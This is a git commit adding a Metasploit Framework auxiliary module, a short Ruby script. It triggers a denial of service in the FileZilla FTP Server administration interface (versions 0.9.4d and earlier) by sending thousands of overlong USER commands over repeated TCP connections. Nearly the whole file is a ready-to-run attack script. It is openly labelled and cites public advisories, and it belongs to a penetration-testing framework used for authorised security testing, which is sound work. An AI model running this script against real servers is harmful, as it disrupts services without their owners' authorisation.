2325f5ce492d0cecf6a45c8ceeb89a7e1cb0f6e7
Patrick Webster <patrick@aushack.com>
2009-01-11 14:38:10 +0000

    Added aux module filezilla_admin_user.rb
    git-svn-id: file:///home/svn/framework3/trunk@6127 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/windows/ftp/filezilla_admin_user.rb
@@ -0,0 +1,54 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/ 
+##
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Auxiliary::Dos
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'		=> 'FileZilla FTP Server Admin Interface Denial of Service',
+			'Description'	=> %q{
+				This module triggers a Denial of Service condition in the FileZilla FTP
+				Server Administration Interface in versions 0.9.4d and earlier.
+				By sending a procession of excessively long USER commands to the FTP
+				Server, the Administration Interface (FileZilla Server Interface.exe)
+				when running, will overwrite the stack with our string and generate an
+				exception. The FileZilla FTP Server itself will continue functioning.
+			},
+			'Author' 		=> [ 'patrick' ],
+			'License'        	=> MSF_LICENSE,
+			'Version'        	=> '$Revision$',
+			'References'     =>
+				[
+					[ 'BID', '15346' ],
+					[ 'CVE', '2005-3589' ],
+					[ 'URL', 'http://www.milw0rm.com/exploits/1336' ],
+					[ 'OSVDB', '20817' ],
+				],
+			'DisclosureDate' => 'Nov 07 2005'))
+	end
+
+	def run
+		print_status("Sending 4000 packets, this may take a while.")
+
+		4000.times do |x|
+			connect
+			sock.put("USER #{"A" * x}\r\n")
+			disconnect
+		end
+	end
+
+end
